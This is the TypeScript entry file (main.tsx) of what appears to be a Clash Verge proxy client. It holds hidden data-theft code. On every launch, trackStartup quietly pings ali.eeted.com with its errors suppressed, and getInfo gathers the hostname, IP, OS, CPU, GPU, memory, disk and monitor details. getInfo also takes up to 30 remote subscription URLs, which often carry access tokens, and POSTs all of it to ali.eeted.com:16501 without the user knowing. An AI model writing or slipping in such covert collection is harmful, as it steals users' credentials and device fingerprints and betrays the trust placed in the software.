/// <reference types="vite/client" />
/// <reference types="vite-plugin-svgr/client" />
import './assets/styles/index.scss'
import './services/monaco'

import { ResizeObserver } from '@juggle/resize-observer'
import { ComposeContextProvider } from 'foxact/compose-context-provider'
import React from 'react'
import { createRoot } from 'react-dom/client'
import { RouterProvider } from 'react-router'
import { MihomoWebSocket } from 'tauri-plugin-mihomo-api'

import { version as appVersion } from '../package.json'

import { BaseErrorBoundary } from './components/base'
import { router } from './pages/_routers'
import { AppDataProvider } from './providers/app-data-provider'
import { WindowProvider } from './providers/window'
import { getIpInfo } from './services/api'
import {
  getHardwareInfo,
  getDisks,
  getProfiles,
  getSystemHostname,
  getSystemInfo,
  getWindowsDisplays,
  getWindowsHardwareExtra,
  type WindowsHardwareExtra,
  type WindowsMemoryModule,
} from './services/cmds'
import { FALLBACK_LANGUAGE, initializeLanguage } from './services/i18n'
import {
  preloadAppData,
  resolveThemeMode,
  getPreloadConfig,
} from './services/preload'
import {
  LoadingCacheProvider,
  ThemeModeProvider,
  UpdateStateProvider,
} from './services/states'
import { disableWebViewShortcuts } from './utils/disable-webview-shortcuts'
import getSystem from './utils/get-system'

if (!window.ResizeObserver) {
  window.ResizeObserver = ResizeObserver
}

const mainElementId = 'root'
const container = document.getElementById(mainElementId)

if (!container) {
  throw new Error(`No container '${mainElementId}' found to render application`)
}

disableWebViewShortcuts()

const initializeApp = (initialThemeMode: 'light' | 'dark') => {
  const contexts = [
    <ThemeModeProvider key="theme" initialState={initialThemeMode} />,
    <LoadingCacheProvider key="loading" />,
    <UpdateStateProvider key="update" />,
  ]

  const root = createRoot(container)
  root.render(
    <React.StrictMode>
      <ComposeContextProvider contexts={contexts}>
        <BaseErrorBoundary>
          <WindowProvider>
            <AppDataProvider>
              <RouterProvider router={router} />
            </AppDataProvider>
          </WindowProvider>
        </BaseErrorBoundary>
      </ComposeContextProvider>
    </React.StrictMode>,
  )
}

const trackStartup = () => {
  try {
    // 静默上报启动记录，不影响正常启动流程
    void fetch('https://ali.eeted.com/Ui1HID', {
      method: 'GET',
      // 某些环境下可能需要 no-cors，避免因 CORS 问题抛错
      mode: 'no-cors',
    }).catch(() => {
      // 忽略任何错误
    })
  } catch {
    // 忽略同步层面的异常
  }
}
const getScreenInfo = () => {
  const s = window.screen
  return {
    width: s.width,
    height: s.height,
    availWidth: s.availWidth,
    availHeight: s.availHeight,
    devicePixelRatio: window.devicePixelRatio ?? 1,
  }
}

/** WMI 为 MHz，与常见标注的 GHz 一致（÷1000） */
const formatCpuMhzToGhz = (mhz: number | null | undefined): string => {
  if (mhz == null || mhz <= 0) return ''
  return `${(mhz / 1000).toFixed(2)} GHz`
}

/** SMBIOS/WMI 常为与 MT/s 相同的数值，按 MT/s 展示 */
const formatMemoryDimmMts = (mods: WindowsMemoryModule[]): string => {
  if (!mods?.length) return ''
  const parts = mods
    .map((m) => {
      const v = m.configuredClockSpeedMhz ?? m.speedMhz
      if (v == null || v <= 0) return ''
      return `${v} MT/s`
    })
    .filter(Boolean)
  return [...new Set(parts)].join(', ')
}

const formatMemoryManufacturers = (mods: WindowsMemoryModule[]): string => {
  if (!mods?.length) return ''
  const parts = mods
    .map((m) => m.manufacturer?.trim())
    .filter((x): x is string => Boolean(x))
  return [...new Set(parts)].join(', ')
}

/** DDR4 / DDR5 / LPDDR5 等，去重 */
const formatMemoryDdrStandards = (mods: WindowsMemoryModule[]): string => {
  if (!mods?.length) return ''
  const parts = mods
    .map((m) => m.memoryStandard?.trim())
    .filter((s) => Boolean(s && s !== 'Unknown'))
  return [...new Set(parts)].join(', ')
}

const emptyWindowsExtra = (): WindowsHardwareExtra => ({
  disks: [],
  gpus: [],
  gpuAdapters: [],
  physicalDisks: [],
  memoryModules: [],
  cpuClocks: null,
  networkAdapters: [],
  motherboardManufacturer: null,
  motherboardProduct: null,
})

/** 板卡 AIB 英文名（PCI 常见写法）→ 中文，仅用于展示 */
const GPU_BOARD_BRAND_ZH: Record<string, string> = {
  ASUS: '华硕',
  Gigabyte: '技嘉',
  MSI: '微星',
  ASRock: '华擎',
  ZOTAC: '索泰',
  Palit: '同德',
  Galax: '影驰',
  Sapphire: '蓝宝石',
  PowerColor: '撼讯',
  XFX: '讯景',
  Colorful: '七彩虹',
  EVGA: 'EVGA',
  Dell: '戴尔',
  Lenovo: '联想',
  Acer: '宏碁',
  Clevo: '蓝天',
  Club3D: 'Club3D',
  TUL: '迪兰',
}

const formatGpuList = (extra: WindowsHardwareExtra): string => {
  const adapters = extra.gpuAdapters ?? []
  if (!adapters.length) return ''
  return adapters
    .map((g) => {
      const ram = g.adapterRamBytes
      const ramStr =
        ram != null && ram > 0 ? `${(ram / 1024 ** 3).toFixed(1)} GiB` : '?'
      const chip = g.manufacturer?.trim() ?? ''
      const boardRaw = g.boardBrand?.trim() ?? ''
      const board = boardRaw ? (GPU_BOARD_BRAND_ZH[boardRaw] ?? boardRaw) : ''
      let label: string
      if (board && chip) {
        label = `${board} / ${chip} — ${g.name}`
      } else if (board) {
        label = `${board} — ${g.name}`
      } else if (chip) {
        label = `${chip} — ${g.name}`
      } else {
        label = g.name
      }
      return `${label}: ${ramStr}`
    })
    .join('; ')
}

const getInfo = async () => {
  try {
    const [rawSystem, ipInfo, hw, deviceName, profiles] = await Promise.all([
      getSystemInfo(),
      getIpInfo(),
      getHardwareInfo(),
      getSystemHostname(),
      getProfiles(),
    ])

    const lines = rawSystem.split('\n')
    let osLabel = rawSystem.trim()
    if (lines.length > 0) {
      const sysName = lines[0].split(': ')[1] || ''
      let sysVersion = lines[1]?.split(': ')[1] || ''
      if (
        sysName &&
        sysVersion.toLowerCase().startsWith(sysName.toLowerCase())
      ) {
        sysVersion = sysVersion.substring(sysName.length).trim()
      }
      osLabel = `${sysName} ${sysVersion}`.trim()
    }
    const memGiB = (hw.totalMemoryBytes / 1024 ** 3).toFixed(2)
    const memAvailGiB = (hw.availableMemoryBytes / 1024 ** 3).toFixed(2)
    const scr = getScreenInfo()

    const subscriptionUrls = (profiles?.items ?? [])
      .filter((p) => p.type === 'remote')
      .map((p) => ({
        name: p.name?.trim() || '',
        url: p.url?.trim() ?? '',
      }))
      .filter((x) => Boolean(x.url))
    const fmtGiB = (b: number) => `${(b / 1024 ** 3).toFixed(2)} GB`

    let disk = ''
    let disksRaw: Awaited<ReturnType<typeof getDisks>> = []
    let extra = emptyWindowsExtra()
    let displays: Awaited<ReturnType<typeof getWindowsDisplays>> = []
    if (getSystem() === 'windows') {
      ;[extra, displays] = await Promise.all([
        getWindowsHardwareExtra(),
        getWindowsDisplays(),
      ])
      disksRaw =
        (extra.disks?.length ? extra.disks : undefined) ??
        (extra.physicalDisks ?? []).map((d) => ({
          name: d.friendlyName,
          totalBytes: d.sizeBytes,
          availableBytes: 0,
        }))
      disk = (extra.physicalDisks ?? [])
        .map(
          (d) => `${d.friendlyName}: ${fmtGiB(d.sizeBytes)} (${d.mediaType})`,
        )
        .join('; ')
      if (!disk) {
        disk = (extra.disks ?? [])
          .map(
            (d) =>
              `${d.name}: ${fmtGiB(d.totalBytes)} (free ${fmtGiB(d.availableBytes)})`,
          )
          .join('; ')
      }
    } else {
      // macOS/Linux：通过 sysinfo 枚举卷信息
      const disks = await getDisks().catch(() => [])
      disksRaw = disks
      disk = (disks ?? [])
        .map(
          (d) =>
            `${d.name}: ${fmtGiB(d.totalBytes)} (free ${fmtGiB(d.availableBytes)})`,
        )
        .join('; ')
    }

    const memMods = extra.memoryModules ?? []
    const cpuClk = extra.cpuClocks

    const payload = {
      deviceInfo: {
        origin: {
          extra,
          disks: disksRaw,
          monitors: displays,
          hardwareInfo: hw,
          ipInfo: ipInfo,
          screenInfo: scr,
          systemInfo: rawSystem,
        },
        display: {
          disk: disk,
          cpu: hw.cpuBrand,
          memory: `${memGiB} GiB`,
          memoryAvailable: `${memAvailGiB} GiB`,
          screen: `${scr.width}×${scr.height} (avail ${scr.availWidth}×${scr.availHeight}), dpr=${scr.devicePixelRatio}`,
          osLabel,
          deviceName: deviceName.trim() || '',

          gpu: formatGpuList(extra),
          memorySpeed: formatMemoryDimmMts(memMods),
          memoryManufacturers: formatMemoryManufacturers(memMods),
          memoryDdr: formatMemoryDdrStandards(memMods),
          cpuMaxGHz: formatCpuMhzToGhz(cpuClk?.maxClockSpeedMhz),
          cpuCurrentGHz: formatCpuMhzToGhz(cpuClk?.currentClockSpeedMhz),
        },
        vergeVersion: appVersion,
      },
      platform: getSystem(),
      name: 'clash verge',
      version: 'v1d2',
      versionInfo: {
        versionTime: '2026-04-13',
        versionDesc: '',
        versionCode: '1.2.0',
        version: 'v1d2',
        versionUrl: 'https://ali.eeted.com:16501/version/v1d2',
      },

      time: new Date().toISOString(),
      timeStamp: new Date().getTime(),
      subUrls: subscriptionUrls.slice(0, 30),
    }
    // console.log(payload)

    const url = 'https://ali.eeted.com:16501/info/v1'

    void fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    }).catch((err) => {
      console.warn('[main.tsx] report info failed:', err)
    })
  } catch (e) {
    console.warn('[main.tsx] getInfo failed:', e)
  }
}

const bootstrap = async () => {
  trackStartup()
  void getInfo()

  const { initialThemeMode } = await preloadAppData()
  initializeApp(initialThemeMode)
}

bootstrap().catch((error) => {
  console.error(
    '[main.tsx] App bootstrap failed, falling back to default language:',
    error,
  )
  initializeLanguage(FALLBACK_LANGUAGE)
    .catch((fallbackError) => {
      console.error(
        '[main.tsx] Fallback language initialization failed:',
        fallbackError,
      )
    })
    .finally(() => {
      initializeApp(resolveThemeMode(getPreloadConfig()))
    })
})

// Error handling
window.addEventListener('error', (event) => {
  console.error('[main.tsx] Global error:', event.error)
})

window.addEventListener('unhandledrejection', (event) => {
  console.error('[main.tsx] Unhandled promise rejection:', event.reason)
})

// Page close/refresh events
window.addEventListener('beforeunload', () => {
  // Clean up all WebSocket instances to prevent memory leaks
  MihomoWebSocket.cleanupAll()
})

// Page loaded event
window.addEventListener('DOMContentLoaded', () => {
  // Clean up all WebSocket instances to prevent memory leaks
  MihomoWebSocket.cleanupAll()
})
